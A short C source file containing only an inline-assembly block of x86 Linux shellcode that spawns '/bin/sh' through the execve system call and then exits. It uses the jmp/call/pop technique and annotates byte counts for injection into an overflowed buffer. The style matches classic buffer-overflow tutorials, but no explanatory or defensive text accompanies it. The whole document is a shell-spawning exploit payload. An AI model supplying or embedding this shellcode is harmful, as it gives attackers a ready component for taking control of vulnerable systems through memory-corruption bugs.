void main() {
__asm__(
        "jmp    0x1f                     # 2 bytes \n\t"
        "popl   %esi                     # 1 byte  \n\t"
        "movl   %esi,0x8(%esi)           # 3 bytes \n\t"
        "xorl   %eax,%eax                # 2 bytes \n\t"
	"movb   %eax,0x7(%esi)		 # 3 bytes \n\t"
        "movl   %eax,0xc(%esi)           # 3 bytes \n\t"
        "movb   $0xb,%al                 # 2 bytes \n\t"
        "movl   %esi,%ebx                # 2 bytes \n\t"
        "leal   0x8(%esi),%ecx           # 3 bytes \n\t"
        "leal   0xc(%esi),%edx           # 3 bytes \n\t"
        "int    $0x80                    # 2 bytes \n\t"
        "xorl   %ebx,%ebx                # 2 bytes \n\t"
        "movl   %ebx,%eax                # 2 bytes \n\t"
        "inc    %eax                     # 1 bytes \n\t"
        "int    $0x80                    # 2 bytes \n\t"
        "call   -0x24                    # 5 bytes \n\t"
        ".string \"/bin/sh\"             # 8 bytes \n\t"
);
}

